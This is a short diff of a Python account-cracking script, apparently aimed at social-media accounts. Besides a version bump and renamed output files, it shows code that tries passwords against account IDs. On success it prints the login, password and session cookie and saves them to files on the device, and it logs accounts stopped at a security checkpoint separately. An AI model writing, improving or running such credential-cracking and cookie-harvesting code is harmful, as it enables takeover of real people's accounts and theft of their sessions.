@@ -199,7 +199,7 @@ logo=("""\033[1;32m
 def info():         
     print("""\033[1;32m=====================\033[1;37m=====================
 • DEVLOPER : \033[1;37mJONES-\033[1;32mHAKKU\033[1;37m
-• Version  :\033[1;32m 1.0 \033[1;32m \033[1;37m
+• Version  :\033[1;32m 1.1 \033[1;32m \033[1;37m
 \033[1;32m=====================\033[1;37m=====================""")
 
 def banner():
@@ -731,13 +731,13 @@ def crack(idf,pwv):
 				print(f'\r{P}{H} [HAKKU-OK] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				cek_apk(kuki)
-				open('/sdcard/JONES-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
+				open('/sdcard/PRATIK-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
 				jones(idf,pw,kuki)
 				break
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{P}[{K}HAKKU-CP{P}] {K}{idf}|{pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				open('/sdcard/JONES-CP.txt', 'a').write( idf+' | '+pw+'\n')
+				open('/sdcard/PRATIK-CP.txt', 'a').write( idf+' | '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
